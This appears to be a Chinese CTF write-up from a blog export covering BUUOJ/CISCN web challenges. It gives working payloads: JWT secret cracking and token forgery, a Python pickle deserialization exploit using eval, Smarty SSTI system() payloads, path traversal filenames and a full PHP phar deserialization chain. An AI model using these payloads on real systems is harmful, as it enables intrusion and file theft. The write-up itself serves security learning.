<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;utl_here/shop?page=&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">2000</span>):</span><br><span class="line">    r = requests.get(url + <span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;lv6.png&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>结账的时候发现要<code>1145141919.0</code>才能买下，应该是要抓包改一下</p>
<p><img src="https://i.loli.net/2021/04/20/3UkrX7lyMep8Obz.png"></p>
<p>改一下折扣，发现需要admin才能进入</p>
<h3 id="JWT解密"><a href="#JWT解密" class="headerlink" title="JWT解密"></a>JWT解密</h3><p>重新抓包，发现了JWT，进<a href="https://jwt.io/">JWT解密网站</a>解出来</p>
<p>然后用<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>解出key为<code>1Kun</code>（tips：k要大写</p>
<p>最后再重新生成一下JWT</p>
<p><img src="https://i.loli.net/2021/04/21/nimrRTh682gJpaV.png"></p>
<p>抓包上传一下，成功进入</p>
<h3 id="python反序列化漏洞"><a href="#python反序列化漏洞" class="headerlink" title="python反序列化漏洞"></a>python反序列化漏洞</h3><p>源代码内发现一个<a href="http://www.zip/">www.zip</a></p>
<p><img src="https://i.loli.net/2021/04/21/5g1Sa23WAjf8tGR.png"></p>
<p>下载后进入Admin.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>这里可以看出使用了tornado的<code>get_argument</code>进行获取become变量，然后使用<code>pickle</code>进行序列化，这里就是我们可以利用的点</p>
<p>具体看这里<a href="http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">关于Python sec的一些简单的总结</a>还有这里<a href="https://xz.aliyun.com/t/2289#toc-5">Python反序列化漏洞的花式利用</a></p>
<p>所以我们就可以写一个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;, &#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
<p>这样就可以算出来提取flag的become值，然后再提交一次就可以拿到flag了</p>
<blockquote>
<p>flag{a18502ab-fc97-410e-8bb7-744f815d7601}</p>
</blockquote>
<h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><h3 id="smarty的SSTI"><a href="#smarty的SSTI" class="headerlink" title="smarty的SSTI"></a>smarty的SSTI</h3><p>看到smarty时想到了SSTI，并且提示注入点在X-Forwarded-For，简单测试一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;7 * 7&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>回显出49，说明存在smartySSTI，查了一下常用的payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> phpinfo()&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">&#x27;ls&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123; readfile(<span class="string">&#x27;/flag&#x27;</span>) &#125;</span><br><span class="line">&#123;<span class="keyword">if</span> show_source(<span class="string">&#x27;/flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">&#x27;cat ../../../flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125; </span><br></pre></td></tr></table></figure>
<p>成功拿到flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure>
<h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><p>注册登陆后有个上传文件的按钮，本来以为是upload的，但是传了点东西都没啥反应，也不知道上传目录在哪，点下载的时候抓包发现了一个<code>filename</code>，应该可以把需要的文件下下来看源码</p>
<blockquote>
<p>../../index.php</p>
<p>../../download.php</p>
<p>../../delete.php</p>
<p>../../class.php (这个是下完index.php后在里面看到include的</p>
</blockquote>
<h3 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h3><p><a href="https://xz.aliyun.com/t/2715">这里是原理</a></p>
<p>看看class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> mysqli(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;store_result();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_result(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = scandir(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line">            <span class="variable">$file</span>-&gt;open(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . htmlentities(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>) &amp;&amp; !is_dir(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以发现最下面有一个<code>file_get_contents</code>，这里应该是拿flag的地方，但是要先跑close()方法，这里看到上面的User类，这里执行__destruct()方法后会执行一个$this-&gt;db-&gt;close()，但是User里并没有close()方法，所以应该是从这里调用close()方法，然后看到FileList()类，这里有一个__call方法，那么我们可以使User类中的$db = new FileList()，这样就会执行FileList中的__call方法，进而执行close()，然后我们需要执行的是File中的close，所以我们可以使FileList中的$files = array(new File())，这样就可以调用File中的close方法了</p>
<p>最终的exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="keyword">new</span> File());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>); <span class="comment">// 这里的GIF89a是伪造gif</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$object</span>-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<p>然后由于download里把flag过滤了，所以我们可以从delete里跑phar流</p>
<p><img src="https://i.loli.net/2021/04/24/zuUbQ74EipNXfS1.png"></p>
<p>就可以拿到flag了</p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>BUUOJ</tag>
      </tags>
  </entry>
</search>
